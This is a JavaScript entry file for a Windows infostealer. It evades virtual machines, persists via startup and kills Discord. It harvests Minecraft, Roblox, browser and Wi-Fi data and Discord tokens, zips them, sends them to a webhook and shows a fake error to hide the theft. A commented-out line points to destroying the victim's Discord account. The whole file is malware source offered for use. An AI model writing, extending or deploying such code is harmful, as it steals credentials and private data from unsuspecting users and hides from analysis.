if (process.platform !== 'win32') process.exit();

const { sep, join } = require('path');
const { mkdtempSync } = require('fs');
const os = require('os');
const config = require('./config');
const { spawnSync } = require('child_process');
const { checkVM, killTasks } = require('./functions/anti-vm');
const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
module.exports.tempFolder = tempFolder;
process.argv0.includes('node') && spawnSync('explorer', [tempFolder]);

if (config.vmProtect && checkVM()) {
  if (config.bsodIfVm) {
    killTasks();
  } else {
    process.exit();
  }
} else {
  config.addToStartup && require('./functions/startup');
  config.discord.killProcess && require('./functions/kill-discord');
  require('./functions/grab-mc');
  require('./functions/grab-roblox');
  require('./functions/grab-browsers-data');
  config.wifiNetworks && require('./functions/wifi-networks');

  require('./functions/grab-discord-token').then(() => {
    // require('./functions/nuke-discord-account');
    if (config.discord.autoJoinGuild && typeof config.discord.autoJoinGuild === 'string') require('./functions/auto-join-guild');

    require('./functions/zip').then(zipFile => {
      require('./functions/webhook')(zipFile);
    });
  });
  config.fakeError && require('./functions/fake-error');
}
